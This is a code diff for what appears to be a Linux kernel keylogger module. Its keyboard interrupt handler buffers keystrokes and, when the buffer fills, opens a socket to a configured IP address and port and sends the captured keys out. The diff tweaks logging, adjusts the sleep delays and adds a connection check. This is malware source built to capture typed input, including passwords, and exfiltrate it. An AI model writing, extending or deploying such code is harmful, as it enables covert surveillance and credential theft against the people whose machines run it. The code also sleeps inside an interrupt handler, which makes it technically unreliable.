@@ -28,18 +28,24 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
         keystrokes[buffer_count] = key;
         buffer_count = (buffer_count + 1)%KEY_BUFFER_SIZE;
 
-        printk(KERN_INFO "Buffer: %s", keystrokes);
-        printk(KERN_INFO "Buffer size: %d", buffer_count);
+        printk(KERN_INFO "Buffer: %s\n", keystrokes);
+        printk(KERN_INFO "Buffer size: %d\n", buffer_count);
 
         if (buffer_count == 0) {
+            msleep(2000);
             struct socket* sock = create_socket(IP_ADDRESS, PORT);
-            printk(KERN_INFO "Created socket");
-            msleep(10000);
+            printk(KERN_INFO "Created socket\n");
+            msleep(5000);
+            if (sock == NULL) {
+                printk(KERN_INFO "Oh no, no connection\n");
+                return IRQ_NONE;
+            }
+            
             send_message(sock, keystrokes);
-            printk(KERN_INFO "Sent message");
+            printk(KERN_INFO "Sent message\n");
             msleep(10000);
             shutdown_socket(sock);
-            printk(KERN_INFO "Closed socket");
+            printk(KERN_INFO "Closed socket\n");
             msleep(10000);
         }
     }
